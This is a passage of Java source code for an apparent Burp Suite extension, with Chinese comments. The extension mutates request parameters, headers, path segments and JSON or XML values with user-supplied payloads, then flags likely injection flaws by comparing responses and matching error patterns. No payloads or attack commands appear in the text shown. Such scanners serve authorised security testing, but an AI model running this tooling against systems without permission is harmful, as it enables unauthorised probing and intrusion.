        for (String pat : diyErrorText.split("\n")) {
            String v = pat.trim();
            if (v.isEmpty()) continue;
            try {
                compiled.add(Pattern.compile(v, Pattern.DOTALL | Pattern.CASE_INSENSITIVE));
            } catch (Exception ignored) {}
        }
        compiledErrorPatterns = compiled;
    }

    private String findMatchedErrorPattern(String respBody) {
        for (Pattern p : compiledErrorPatterns) {
            if (p.matcher(respBody).find()) {
                return p.pattern();
            }
        }
        return null;
    }

    private double textSimilarity(String a, String b) {
        if (a == null || b == null) return 0.0;
        if (a.equals(b)) return 1.0;
        int maxLen = Math.max(a.length(), b.length());
        if (maxLen == 0) return 1.0;
        int dist = levenshteinDistance(a, b);
        return 1.0 - ((double) dist / maxLen);
    }

    private int levenshteinDistance(String a, String b) {
        int n = a.length();
        int m = b.length();
        if (n == 0) return m;
        if (m == 0) return n;

        int[] prev = new int[m + 1];
        int[] curr = new int[m + 1];

        for (int j = 0; j <= m; j++) {
            prev[j] = j;
        }

        for (int i = 1; i <= n; i++) {
            curr[0] = i;
            char ca = a.charAt(i - 1);
            for (int j = 1; j <= m; j++) {
                int cost = (ca == b.charAt(j - 1)) ? 0 : 1;
                int del = prev[j] + 1;
                int ins = curr[j - 1] + 1;
                int sub = prev[j - 1] + cost;
                curr[j] = Math.min(Math.min(del, ins), sub);
            }
            int[] tmp = prev;
            prev = curr;
            curr = tmp;
        }

        return prev[m];
    }

    private double jaccardSimilarity(String a, String b) {
        if (a == null || b == null) return 0.0;
        Set<String> setA = tokenizeForJaccard(a);
        Set<String> setB = tokenizeForJaccard(b);
        if (setA.isEmpty() && setB.isEmpty()) return 1.0;

        Set<String> intersection = new HashSet<>(setA);
        intersection.retainAll(setB);

        Set<String> union = new HashSet<>(setA);
        union.addAll(setB);

        if (union.isEmpty()) return 1.0;
        return (double) intersection.size() / union.size();
    }

    private Set<String> tokenizeForJaccard(String text) {
        Set<String> tokens = new HashSet<>();
        String normalized = text.toLowerCase();
        String[] parts = normalized.split("[^a-z0-9\\u4e00-\\u9fa5]+");
        for (String part : parts) {
            if (!part.isEmpty()) {
                tokens.add(part);
            }
        }
        return tokens;
    }

    private HttpRequestResponse sendRequestWithInterval(HttpRequest req) {
        Semaphore semaphore = requestSemaphore;
        boolean acquired = false;
        try {
            semaphore.acquire();
            acquired = true;
            return http.sendRequest(req);
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
            throw new RuntimeException("Request interrupted while waiting for concurrency permit", ie);
        } finally {
            if (acquired) {
                semaphore.release();
            }
        }
    }

    private HttpRequestResponse buildDisplayMessage(HttpRequest sentRequest, HttpRequestResponse actualResult) {
        HttpRequest displayRequest = sentRequest;
        if (actualResult != null && actualResult.request() != null) {
            displayRequest = actualResult.request();
        }
        return HttpRequestResponse.httpRequestResponse(displayRequest, actualResult.response());
    }

    private String extractHost(String url) {
        try {
            URI uri = URI.create(url);
            String h = uri.getHost();
            if (h != null && !h.trim().isEmpty()) return h.toLowerCase();
        } catch (Exception ignored) {}
        try {
            String u = url;
            int schemeIdx = u.indexOf("://");
            if (schemeIdx >= 0) u = u.substring(schemeIdx + 3);
            int slash = u.indexOf('/');
            if (slash >= 0) u = u.substring(0, slash);
            int colon = u.indexOf(':');
            if (colon >= 0) u = u.substring(0, colon);
            return u.toLowerCase();
        } catch (Exception ignored) {
            return "";
        }
    }

    private boolean isWhitelistedHost(String host, String rules) {
        String h = host == null ? "" : host.trim().toLowerCase();
        if (h.isEmpty()) return false;
        if (rules == null || rules.trim().isEmpty()) return true;

        for (String raw : rules.split(",")) {
            String rule = raw.trim().toLowerCase();
            if (rule.isEmpty()) continue;
            if (matchesWhiteRule(h, rule)) return true;
        }
        return false;
    }

    private boolean matchesWhiteRule(String host, String rule) {
        if ("*".equals(rule) || "all".equals(rule)) return true;
        if (rule.startsWith("*.")) {
            String root = rule.substring(2);
            return host.equals(root) || host.endsWith("." + root);
        }
        return host.equals(rule);
    }

    private LogEntry addDetailEntry(LogEntry entry) {
        synchronized (log2) {
            log2.add(entry);
        }

        String selectedMd5 = dataMd5Id;
        if (selectedMd5 != null && selectedMd5.equals(entry.dataMd5)) {
            synchronized (log3) {
                log3.add(entry);
            }
            requestDetailRefresh();
        }
        return entry;
    }

    private void requestDetailRefresh() {
        if (detailRefreshPending.incrementAndGet() > 1) {
            return;
        }
        SwingUtilities.invokeLater(() -> {
            detailRefreshPending.set(0);
            model.fireTableDataChanged();
        });
    }

    private void markEntries(List<LogEntry> entries, String sign) {
        for (LogEntry entry : entries) {
            if (entry.change == null || entry.change.trim().isEmpty()) {
                entry.change = sign;
            } else if (!entry.change.contains(sign)) {
                entry.change = entry.change + " | " + sign;
            }
            entry.isVulnRow = true;
        }
    }

    private HttpRequest buildMutatedRequest(HttpRequest req, ScanTarget target, String newValue) {
        if (target.isHeaderTarget) {
            return updateHeaderValue(req, target.name, newValue);
        }
        if (target.isPathTarget) {
            return updatePathValue(req, target.pathIndex, newValue);
        }
        if (target.isJsonArrayTarget) {
            HttpRequest arrReq = buildJsonArrayRequest(req, target.jsonArrayIndex, newValue);
            if (arrReq != req) return normalizeBodyFraming(arrReq);
            return req;
        }
        if (target.isJsonDeepTarget) {
            HttpRequest deepReq = buildJsonDeepRequest(req, target.jsonDeepIndex, newValue);
            if (deepReq != req) return normalizeBodyFraming(deepReq);
            return req;
        }

        HttpParameterType type = target.paramType;
        if (type == HttpParameterType.URL) {
            HttpRequest urlReq = buildUrlParamRequest(req, target.name, newValue);
            if (urlReq != req) return urlReq;
        }
        boolean jsonLike = (type == HttpParameterType.JSON || isJsonBody(req));
        boolean xmlLike = isXmlBody(req);

        if (jsonLike && isChunkedTransfer(req)) {
            return req;
        }
        if (xmlLike && isChunkedTransfer(req)) {
            return req;
        }

        if (jsonLike) {
            HttpRequest jsonReq = buildJsonRequest(req, target.name, newValue);
            if (jsonReq != req) return normalizeBodyFraming(jsonReq);
            return req;
        }
        if (xmlLike) {
            HttpRequest xmlReq = buildXmlRequest(req, target.name, newValue);
            if (xmlReq != req) return normalizeBodyFraming(xmlReq);
            return req;
        }

        return req.withUpdatedParameters(HttpParameter.parameter(target.name, newValue, type));
    }

    private HttpRequest buildUrlParamRequest(HttpRequest req, String paramName, String newValue) {
        try {
            URI uri = URI.create(req.url().toString());
            String rawQuery = uri.getRawQuery();
            if (rawQuery == null || rawQuery.isEmpty()) return req;

            String[] parts = rawQuery.split("&", -1);
            boolean replaced = false;
            for (int i = 0; i < parts.length; i++) {
                String item = parts[i];
                int eq = item.indexOf('=');
                String rawKey = eq >= 0 ? item.substring(0, eq) : item;
                String key = urlDecode(rawKey);
                if (!paramName.equals(key)) continue;

                String encodedValue = urlEncodeQueryValue(newValue);
                parts[i] = rawKey + "=" + encodedValue;
                replaced = true;
                break;
            }
            if (!replaced) return req;

            StringBuilder newUrl = new StringBuilder();
            newUrl.append(uri.getScheme()).append("://").append(uri.getRawAuthority());
            newUrl.append(uri.getRawPath() == null ? "/" : uri.getRawPath());
            newUrl.append('?').append(String.join("&", parts));
            if (uri.getRawFragment() != null && !uri.getRawFragment().isEmpty()) {
                newUrl.append('#').append(uri.getRawFragment());
            }
            return applyRequestUrl(req, newUrl.toString());
        } catch (Exception ignored) {
            return req;
        }
    }

    private HttpRequest updateHeaderValue(HttpRequest req, String headerName, String newValue) {
        HttpRequest updated = tryInvokeRequestMethod(req, "withUpdatedHeader", headerName, newValue);
        if (updated != req) return updated;
        return tryInvokeRequestMethod(req, "withAddedHeader", headerName, newValue);
    }

    private HttpRequest updatePathValue(HttpRequest req, int pathIndex, String newValue) {
        try {
            URI uri = URI.create(req.url().toString());
            String rawPath = uri.getRawPath();
            if (rawPath == null || rawPath.isEmpty()) return req;

            String[] parts = rawPath.split("/", -1);
            int current = -1;
            for (int i = 0; i < parts.length; i++) {
                if (parts[i] == null || parts[i].isEmpty()) continue;
                current++;
                if (current == pathIndex) {
                    parts[i] = urlEncodePathSegment(newValue);
                    break;
                }
            }

            StringBuilder pathBuilder = new StringBuilder();
            for (int i = 0; i < parts.length; i++) {
                if (i > 0) pathBuilder.append('/');
                pathBuilder.append(parts[i]);
            }

            StringBuilder newUrl = new StringBuilder();
            newUrl.append(uri.getScheme()).append("://").append(uri.getRawAuthority());
            newUrl.append(pathBuilder);
            if (uri.getRawQuery() != null && !uri.getRawQuery().isEmpty()) {
                newUrl.append('?').append(uri.getRawQuery());
            }
            if (uri.getRawFragment() != null && !uri.getRawFragment().isEmpty()) {
                newUrl.append('#').append(uri.getRawFragment());
            }

            HttpRequest updated = applyRequestPath(req, newUrl.toString());
            if (updated == req) {
                appendLog("Path改写失败，跳过该payload: " + newUrl);
                return req;
            }
            return updated;
        } catch (Exception ignored) {
            return req;
        }
    }

    private HttpRequest applyRequestUrl(HttpRequest req, String newUrl) {
        HttpRequest updated = tryInvokeRequestMethod(req, "withUrl", newUrl);
        if (isUrlChanged(req, updated)) return updated;

        updated = tryInvokeRequestMethod(req, "withUpdatedUrl", newUrl);
        if (isUrlChanged(req, updated)) return updated;

        try {
            URI targetUri = new URI(newUrl);
            updated = tryInvokeRequestMethod(req, "withUrl", targetUri);
            if (isUrlChanged(req, updated)) return updated;

            updated = tryInvokeRequestMethod(req, "withUpdatedUrl", targetUri);
            if (isUrlChanged(req, updated)) return updated;
        } catch (URISyntaxException ignored) {}

        return req;
    }

    private HttpRequest applyRequestPath(HttpRequest req, String newUrl) {
        HttpRequest updated = applyRequestUrl(req, newUrl);
        if (isUrlChanged(req, updated)) return updated;

        updated = tryInvokeRequestMethod(req, "withPath", extractRawPath(newUrl));
        if (isUrlChanged(req, updated)) return updated;

        updated = tryInvokeRequestMethod(req, "withUpdatedPath", extractRawPath(newUrl));
        if (isUrlChanged(req, updated)) return updated;

        return req;
    }

    private boolean isUrlChanged(HttpRequest original, HttpRequest candidate) {
        if (candidate == null || candidate == original) return false;
        try {
            String o = original.url().toString();
            String c = candidate.url().toString();
            return !o.equals(c);
        } catch (Exception ignored) {
            return false;
        }
    }

    private String extractRawPath(String url) {
        try {
            URI uri = URI.create(url);
            return uri.getRawPath();
        } catch (Exception ignored) {
            return "/";
        }
    }

    private String urlEncodeQueryValue(String value) {
        try {
            return URLEncoder.encode(value, StandardCharsets.UTF_8).replace("+", "%20");
        } catch (Exception ignored) {
            return value;
        }
    }

    private String urlEncodePathSegment(String value) {
        try {
            return URLEncoder.encode(value, StandardCharsets.UTF_8).replace("+", "%20");
        } catch (Exception ignored) {
            return value;
        }
    }

    private String urlDecode(String value) {
        try {
            return URLDecoder.decode(value, StandardCharsets.UTF_8);
        } catch (Exception ignored) {
            return value;
        }
    }

    private List<ScanTarget> buildScanTargets(HttpRequest req) {
        List<ScanTarget> targets = new ArrayList<>();
        String hostScope = extractHost(req.url().toString());
        for (ParsedHttpParameter para : req.parameters()) {
            HttpParameterType type = para.type();
            if (type == HttpParameterType.URL || type == HttpParameterType.BODY || type == HttpParameterType.JSON || type == HttpParameterType.MULTIPART_ATTRIBUTE) {
                targets.add(ScanTarget.parameterTarget(para));
            }
        }

        if (isXmlBody(req)) {
            String body = req.bodyToString();
            Pattern xmlLeafPattern = Pattern.compile("<(\\w+)(?:\\s+[^>]*)?>([^<]*)</\\1>", Pattern.CASE_INSENSITIVE);
            Matcher matcher = xmlLeafPattern.matcher(body);
            while (matcher.find()) {
                targets.add(ScanTarget.xmlTarget(matcher.group(1), matcher.group(2).trim()));
            }
        } else if (isJsonBody(req) && req.bodyToString().trim().startsWith("[")) {
            String body = req.bodyToString();
            Pattern arrayPattern = Pattern.compile("\"((?:[^\"\\\\]|\\\\.)*)\"");
            Matcher matcher = arrayPattern.matcher(body);
            int index = 0;
            while (matcher.find()) {
                targets.add(ScanTarget.jsonArrayTarget("[" + index + "]", matcher.group(1), index));
                index++;
            }
        } else if (isJsonBody(req)) {
            String body = req.bodyToString();
            int index = 0;
            int pos = 0;
            int len = body.length();
            while (pos < len) {
                char c = body.charAt(pos);
                if (c == '"') {
                    int end = pos + 1;
                    while (end < len) {
                        char ec = body.charAt(end);
                        if (ec == '\\') { end += 2; continue; }
                        if (ec == '"') break;
                        end++;
                    }
                    if (end >= len) break;
                    int after = end + 1;
                    while (after < len && Character.isWhitespace(body.charAt(after))) after++;
                    if (after < len && body.charAt(after) == ':') {
                        pos = after + 1;
                        continue;
                    }
                    String strVal = body.substring(pos + 1, end);
                    targets.add(ScanTarget.jsonDeepTarget("$." + index, strVal, index));
                    index++;
                    pos = end + 1;
                } else if (c == '-' || Character.isDigit(c)) {
                    int end = pos;
                    if (body.charAt(end) == '-') end++;
                    while (end < len && Character.isDigit(body.charAt(end))) end++;
                    if (end < len && body.charAt(end) == '.') {
                        end++;
                        while (end < len && Character.isDigit(body.charAt(end))) end++;
                    }
                    int before = pos - 1;
                    while (before >= 0 && Character.isWhitespace(body.charAt(before))) before--;
                    if (before >= 0 && (body.charAt(before) == ':' || body.charAt(before) == '[' || body.charAt(before) == ',')) {
                        targets.add(ScanTarget.jsonDeepTarget("$." + index, body.substring(pos, end), index));
                        index++;
                    }
                    pos = end;
                } else if (c == 't' && body.startsWith("true", pos)) {
                    pos += 4;
                } else if (c == 'f' && body.startsWith("false", pos)) {
                    pos += 5;
                } else if (c == 'n' && body.startsWith("null", pos)) {
                    pos += 4;
                } else {
                    pos++;
                }
            }
        }

        if (isHeader == 2) {
            for (HttpHeader header : req.headers()) {
                String name = header.name();
                String value = header.value();
                if (isInjectableHeader(name, value)) {
                    String dedupKey = hostScope + "|" + name.trim().toLowerCase();
                    synchronized (scannedHeaderNames) {
                        if (scannedHeaderNames.contains(dedupKey)) {
                            continue;
                        }
                        scannedHeaderNames.add(dedupKey);
                    }
                    targets.add(ScanTarget.headerTarget(name, value));
                }
            }
        }

        if (isPath == 2) {
            targets.addAll(buildPathTargets(req, hostScope));
        }

        return targets;
    }

    private List<ScanTarget> buildPathTargets(HttpRequest req, String hostScope) {
        List<ScanTarget> targets = new ArrayList<>();
        try {
            URI uri = URI.create(req.url().toString());
            String rawPath = uri.getRawPath();
            if (rawPath == null || rawPath.isEmpty()) return targets;

            String[] parts = rawPath.split("/", -1);
            int pathIndex = 0;
            for (String part : parts) {
                if (part == null || part.isEmpty()) continue;
                String trimmed = part.trim();
                if (trimmed.isEmpty()) continue;
                if (trimmed.contains(".")) {
                    pathIndex++;
                    continue;
                }
                String dedupKey = hostScope + "|" + urlDecode(trimmed).trim().toLowerCase();
                synchronized (scannedPathValues) {
                    if (scannedPathValues.contains(dedupKey)) {
                        pathIndex++;
                        continue;
                    }
                    scannedPathValues.add(dedupKey);
                }
                targets.add(ScanTarget.pathTarget("path[" + pathIndex + "]", trimmed, pathIndex));
                pathIndex++;
            }
        } catch (Exception ignored) {}
        return targets;
    }

    private boolean isInjectableHeader(String name, String value) {
        if (name == null || value == null) return false;
        String n = name.trim().toLowerCase();
        if (n.isEmpty()) return false;
        if (HEADER_BLACKLIST.contains(n) || customHeaderBlacklist.contains(n)) {
            return false;
        }
        return !value.trim().isEmpty();
    }

    private Set<String> parseHeaderBlacklist(String text) {
        Set<String> set = new HashSet<>();
        if (text == null || text.trim().isEmpty()) return set;
        for (String item : text.split(",")) {
            String v = item == null ? "" : item.trim().toLowerCase();
            if (!v.isEmpty()) set.add(v);
        }
        return set;
    }

    private String loadDiyPayloadText() {
        Path path = Paths.get(DIY_PAYLOAD_FILE);
        if (!Files.exists(path)) {
            saveDiyPayloadText(DEFAULT_DIY_PAYLOAD);
            return DEFAULT_DIY_PAYLOAD;
        }

        StringBuilder sb = new StringBuilder();
        try (BufferedReader in = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {
            String line;
            while ((line = in.readLine()) != null) {
                sb.append(line).append("\n");
            }
        } catch (IOException e) {
            appendLog("读取payload文件失败，使用默认payload: " + e.getMessage());
            return DEFAULT_DIY_PAYLOAD;
        }

        String text = sb.toString().trim();
        return text.isEmpty() ? DEFAULT_DIY_PAYLOAD : text;
    }

    private boolean saveDiyPayloadText(String content) {
        Path path = Paths.get(DIY_PAYLOAD_FILE);
        try (BufferedWriter out = Files.newBufferedWriter(path, StandardCharsets.UTF_8)) {
            out.write(content == null ? "" : content);
            return true;
        } catch (IOException e) {
            appendLog("写入payload文件失败: " + e.getMessage());
            return false;
        }
    }

    private static final class ScanTarget {
        final boolean isHeaderTarget;
        final boolean isPathTarget;
        final boolean isXmlTarget;
        final boolean isJsonArrayTarget;
        final boolean isJsonDeepTarget;
        final String name;
        final String value;
        final HttpParameterType paramType;
        final int pathIndex;
        final int jsonArrayIndex;
        final int jsonDeepIndex;

        private ScanTarget(boolean isHeaderTarget, boolean isPathTarget, boolean isXmlTarget, boolean isJsonArrayTarget,
                           boolean isJsonDeepTarget, String name, String value, HttpParameterType paramType,
                           int pathIndex, int jsonArrayIndex, int jsonDeepIndex) {
            this.isHeaderTarget = isHeaderTarget;
            this.isPathTarget = isPathTarget;
            this.isXmlTarget = isXmlTarget;
            this.isJsonArrayTarget = isJsonArrayTarget;
            this.isJsonDeepTarget = isJsonDeepTarget;
            this.name = name;
            this.value = value;
            this.paramType = paramType;
            this.pathIndex = pathIndex;
            this.jsonArrayIndex = jsonArrayIndex;
            this.jsonDeepIndex = jsonDeepIndex;
        }

        static ScanTarget parameterTarget(ParsedHttpParameter para) {
            return new ScanTarget(false, false, false, false, false, para.name(), para.value(), para.type(), -1, -1, -1);
        }

        static ScanTarget headerTarget(String name, String value) {
            return new ScanTarget(true, false, false, false, false, name, value, null, -1, -1, -1);
        }

        static ScanTarget pathTarget(String name, String value, int pathIndex) {
            return new ScanTarget(false, true, false, false, false, name, value, null, pathIndex, -1, -1);
        }

        static ScanTarget xmlTarget(String name, String value) {
            return new ScanTarget(false, false, true, false, false, name, value, null, -1, -1, -1);
        }

        static ScanTarget jsonArrayTarget(String name, String value, int index) {
            return new ScanTarget(false, false, false, true, false, name, value, null, -1, index, -1);
        }

        static ScanTarget jsonDeepTarget(String name, String value, int index) {
            return new ScanTarget(false, false, false, false, true, name, value, null, -1, -1, index);
        }
    }

    private HttpRequest buildJsonRequest(HttpRequest req, String fieldName, String newValue) {
        String body = req.bodyToString();
        String key = Pattern.quote(fieldName);
        String escaped = escapeJson(newValue);

        Pattern quotedValue = Pattern.compile("(\\\"" + key + "\\\"\\s*:\\s*\\\")((?:\\\\.|[^\\\"\\\\])*)(\\\")");
        Matcher quotedMatcher = quotedValue.matcher(body);
        if (quotedMatcher.find()) {
            String replacement = quotedMatcher.group(1) + Matcher.quoteReplacement(escaped) + quotedMatcher.group(3);
            return req.withBody(quotedMatcher.replaceFirst(Matcher.quoteReplacement(replacement)));
        }

        Pattern primitiveValue = Pattern.compile("(\\\"" + key + "\\\"\\s*:\\s*)(-?\\d+(?:\\.\\d+)?|true|false|null)");
        Matcher primitiveMatcher = primitiveValue.matcher(body);
        if (primitiveMatcher.find()) {
            String replacement = primitiveMatcher.group(1) + "\"" + Matcher.quoteReplacement(escaped) + "\"";
            return req.withBody(primitiveMatcher.replaceFirst(Matcher.quoteReplacement(replacement)));
        }
        return req;
    }

    private HttpRequest buildJsonArrayRequest(HttpRequest req, int index, String newValue) {
        String body = req.bodyToString();
        Pattern valuePattern = Pattern.compile("\"((?:[^\"\\\\]|\\\\.)*)\"");
        Matcher matcher = valuePattern.matcher(body);
        int count = 0;
        StringBuffer sb = new StringBuffer();
        while (matcher.find()) {
            if (count == index) {
                String replacement = "\"" + escapeJson(newValue) + "\"";
                matcher.appendReplacement(sb, replacement);
                matcher.appendTail(sb);
                return req.withBody(sb.toString());
            }
            count++;
        }
        return req;
    }

    private HttpRequest buildJsonDeepRequest(HttpRequest req, int targetIndex, String newValue) {
        String body = req.bodyToString();
        String escaped = escapeJson(newValue);
        int index = 0;
        int pos = 0;
        int len = body.length();
        while (pos < len) {
            char c = body.charAt(pos);
            if (c == '"') {
                int end = pos + 1;
                while (end < len) {
                    char ec = body.charAt(end);
                    if (ec == '\\') { end += 2; continue; }
                    if (ec == '"') break;
                    end++;
                }
                if (end >= len) break;
                int after = end + 1;
                while (after < len && Character.isWhitespace(body.charAt(after))) after++;
                if (after < len && body.charAt(after) == ':') {
                    pos = after + 1;
                    continue;
                }
                if (index == targetIndex) {
                    return req.withBody(body.substring(0, pos) + "\"" + escaped + "\"" + body.substring(end + 1));
                }
                index++;
                pos = end + 1;
            } else if (c == '-' || Character.isDigit(c)) {
                int end = pos;
                if (body.charAt(end) == '-') end++;
                while (end < len && Character.isDigit(body.charAt(end))) end++;
                if (end < len && body.charAt(end) == '.') {
                    end++;
                    while (end < len && Character.isDigit(body.charAt(end))) end++;
                }
                int before = pos - 1;
                while (before >= 0 && Character.isWhitespace(body.charAt(before))) before--;
                if (before >= 0 && (body.charAt(before) == ':' || body.charAt(before) == '[' || body.charAt(before) == ',')) {
                    if (index == targetIndex) {
                        return req.withBody(body.substring(0, pos) + "\"" + escaped + "\"" + body.substring(end));
                    }
                    index++;
                }
                pos = end;
            } else if (c == 't' && body.startsWith("true", pos)) {
                pos += 4;
            } else if (c == 'f' && body.startsWith("false", pos)) {
                pos += 5;
            } else if (c == 'n' && body.startsWith("null", pos)) {
                pos += 4;
            } else {
                pos++;
            }
        }
        return req;
    }

    private HttpRequest buildXmlRequest(HttpRequest req, String fieldName, String newValue) {
        String body = req.bodyToString();
        String tag = Pattern.quote(fieldName);
        Pattern element = Pattern.compile("(<\\s*" + tag + "\\s*>)([\\s\\S]*?)(<\\s*/\\s*" + tag + "\\s*>)", Pattern.CASE_INSENSITIVE);
        Matcher matcher = element.matcher(body);
        if (matcher.find()) {
            String replacement = matcher.group(1)
                    + Matcher.quoteReplacement(escapeXml(newValue))
                    + matcher.group(3);
            return req.withBody(matcher.replaceFirst(Matcher.quoteReplacement(replacement)));
        }
        return req;
    }

    private boolean isJsonBody(HttpRequest req) {
        String ct = req.headerValue("Content-Type");
        if (ct != null && ct.toLowerCase().contains("application/json")) return true;
        String body = req.bodyToString().trim();
        return body.startsWith("{") || body.startsWith("[");
    }

    private boolean isXmlBody(HttpRequest req) {
        String ct = req.headerValue("Content-Type");
        if (ct != null) {
            String lower = ct.toLowerCase();
            if (lower.contains("application/xml") || lower.contains("text/xml")) return true;
        }
        return req.bodyToString().trim().startsWith("<");
    }

    private boolean isChunkedTransfer(HttpRequest req) {
        String te = req.headerValue("Transfer-Encoding");
        return te != null && te.toLowerCase().contains("chunked");
    }

    private HttpRequest normalizeBodyFraming(HttpRequest req) {
        HttpRequest normalized = req.withBody(req.bodyToString());
        normalized = tryInvokeRequestMethod(normalized, "withRemovedHeader", "Transfer-Encoding");
        normalized = tryInvokeRequestMethod(normalized, "withRemovedHeader", "transfer-encoding");

        int contentLength = normalized.bodyToString().getBytes(StandardCharsets.UTF_8).length;
        String lenValue = String.valueOf(contentLength);

        HttpRequest updated = tryInvokeRequestMethod(normalized, "withUpdatedHeader", "Content-Length", lenValue);
        if (updated == normalized) {
            updated = tryInvokeRequestMethod(normalized, "withAddedHeader", "Content-Length", lenValue);
        }
        return updated;
    }

    private HttpRequest tryInvokeRequestMethod(HttpRequest req, String methodName, String arg1) {
        try {
            Method m = req.getClass().getMethod(methodName, String.class);
            Object ret = m.invoke(req, arg1);
            if (ret instanceof HttpRequest) return (HttpRequest) ret;
        } catch (Exception ignored) {}
        return req;
    }

    private HttpRequest tryInvokeRequestMethod(HttpRequest req, String methodName, String arg1, String arg2) {
        try {
            Method m = req.getClass().getMethod(methodName, String.class, String.class);
            Object ret = m.invoke(req, arg1, arg2);
            if (ret instanceof HttpRequest) return (HttpRequest) ret;
        } catch (Exception ignored) {}
        return req;
    }

    private HttpRequest tryInvokeRequestMethod(HttpRequest req, String methodName, URI arg1) {
        try {
            Method m = req.getClass().getMethod(methodName, URI.class);
            Object ret = m.invoke(req, arg1);
            if (ret instanceof HttpRequest) return (HttpRequest) ret;
        } catch (Exception ignored) {}
        return req;
    }

    private String escapeJson(String value) {
        return value
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    private String escapeXml(String value) {
        return value
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&apos;");
    }

    // =========================================================
    // MD5
    // =========================================================
    private String md5(String key) {
        char[] hex = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
        try {
            MessageDigest md     = MessageDigest.getInstance("MD5");
            byte[]        digest = md.digest(key.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb     = new StringBuilder();
            for (byte b : digest) {
                sb.append(hex[(b >>> 4) & 0xF]).append(hex[b & 0xF]);
            }
            return sb.toString();
        } catch (Exception e) { return ""; }
    }

    // =========================================================
    // 主表模型方法
    // =========================================================
    public int getRowCount() {
        synchronized (log) {
            return log.size();
        }
    }
    public int    getColumnCount() { return 5; }

    public String getColumnName(int column) {
        switch (column) {
            case 0: return "#";
            case 1: return "来源";
            case 2: return "URL";
            case 3: return "长度";
            case 4: return "状态";
            default: return "";
        }
    }

    public Object getValueAt(int row, int column) {
        LogEntry e;
        synchronized (log) {
            if (row < 0 || row >= log.size()) return "";
            e = log.get(row);
        }
        switch (column) {
            case 0: return e.id;
            case 1: return e.toolFlag == 1024 ? "手动发送" : ("Tool:" + e.toolFlag);
            case 2: return e.url;
            case 3: return e.message.response() != null ? e.message.response().body().length() : 0;
            case 4: return e.state;
            default: return "";
        }
    }

    public boolean isVulnRow(int row) {
        synchronized (log) {
            return row >= 0 && row < log.size() && log.get(row).isVulnRow;
        }
    }

    public void fireTableRowsInserted(int first, int last) {
        ((AbstractTableModel) logTable.getModel()).fireTableRowsInserted(first, last);
    }

    public void fireTableDataChanged() {
        ((AbstractTableModel) logTable.getModel()).fireTableDataChanged();
    }

    // =========================================================
    // 内部类
    // =========================================================
    static class RequestMd5 {
        public final String md5Data;
        public RequestMd5(String d) { md5Data = d; }
    }

    static class LogEntry {
        public final int    id;
        public final int    toolFlag;
        public final HttpRequestResponse message;
        public final String url;
        public final String parameter;
        public       String value;
        public       String change;
        public final String dataMd5;
        public final int    times;
        public final int    code;
        public       String state;
        public       boolean isVulnRow; // true = 标黄

        public LogEntry(int id, int toolFlag, HttpRequestResponse message, String url,
                        String parameter, String value, String change, String dataMd5,
                        int times, String state, int code, boolean isVulnRow) {
            this.id         = id;
            this.toolFlag   = toolFlag;
            this.message    = message;
            this.url        = url;
            this.parameter  = parameter;
            this.value      = value;
            this.change     = change;
            this.dataMd5    = dataMd5;
            this.times      = times;
            this.state      = state;
            this.code       = code;
            this.isVulnRow  = isVulnRow;
        }
    }

    // ── 详情表模型 ────────────────────────────────────────────
    class MyModel extends AbstractTableModel {
        @Override
        public int getRowCount() {
            synchronized (log3) {
                return log3.size();
            }
        }
        @Override public int getColumnCount() { return 6; }

        @Override
        public String getColumnName(int col) {
            switch (col) {
                case 0: return "参数";
                case 1: return "payload";
                case 2: return "长度";
                case 3: return "变化";
                case 4: return "用时";
                case 5: return "状态码";
                default: return "";
            }
        }

        @Override
        public Object getValueAt(int row, int col) {
            LogEntry e;
            synchronized (log3) {
                if (row < 0 || row >= log3.size()) return "";
                e = log3.get(row);
            }
            switch (col) {
                case 0: return e.parameter;
                case 1: return e.value;
                case 2: return e.message.response() != null ? e.message.response().body().length() : 0;
                case 3: return e.change;
                case 4: return e.times;
                case 5: return e.code;
                default: return "";
            }
        }
    }

    // ── 主列表（带黄色高亮渲染器）────────────────────────────
    class Table extends JTable {
        public Table(BurpExtender m) {
            super(new AbstractTableModel() {
                @Override public int    getRowCount()            { return m.getRowCount(); }
                @Override public int    getColumnCount()         { return m.getColumnCount(); }
                @Override public String getColumnName(int c)     { return m.getColumnName(c); }
                @Override public Object getValueAt(int r, int c) { return m.getValueAt(r, c); }
            });

            // 黄色高亮：存在注入的行整行标黄
            DefaultTableCellRenderer renderer = new DefaultTableCellRenderer() {
                @Override
                public Component getTableCellRendererComponent(
                        JTable table, Object value, boolean isSelected,
                        boolean hasFocus, int row, int column) {
                    Component c = super.getTableCellRendererComponent(
                            table, value, isSelected, hasFocus, row, column);
                    if (!isSelected) {
                        c.setBackground(m.isVulnRow(row)
                                ? new Color(255, 255, 0)   // 注入行 → 黄色
                                : Color.WHITE);
                    }
                    return c;
                }
            };
            // 对所有列应用该渲染器
            for (int i = 0; i < getColumnCount(); i++) {
                getColumnModel().getColumn(i).setCellRenderer(renderer);
            }
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            LogEntry entry;
            synchronized (log) {
                if (row < 0 || row >= log.size()) return;
                entry = log.get(row);
            }
            dataMd5Id = entry.dataMd5;

            synchronized (log3) {
                log3.clear();
                synchronized (log2) {
                    for (LogEntry le : log2) {
                        if (le.dataMd5.equals(dataMd5Id)) log3.add(le);
                    }
                }
            }
            model.fireTableDataChanged();

            requestViewer.setRequest(entry.message.request());
            responseViewer.setResponse(entry.message.response());
            super.changeSelection(row, col, toggle, extend);
        }
    }

    // ── 详情列表（prepareRenderer 覆写，黄色高亮，列数无关）──────────────
    class TableLog2 extends JTable {
        public TableLog2(TableModel m) { super(m); }

        @Override
        public Component prepareRenderer(javax.swing.table.TableCellRenderer renderer, int row, int column) {
            Component c = super.prepareRenderer(renderer, row, column);
            if (!isRowSelected(row)) {
                boolean vulnRow = false;
                synchronized (log3) {
                    if (row >= 0 && row < log3.size()) {
                        vulnRow = log3.get(row).isVulnRow;
                    }
                }
                c.setBackground(vulnRow ? new Color(255, 255, 0) : Color.WHITE);
            }
            return c;
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            LogEntry e = null;
            synchronized (log3) {
                if (row >= 0 && row < log3.size()) {
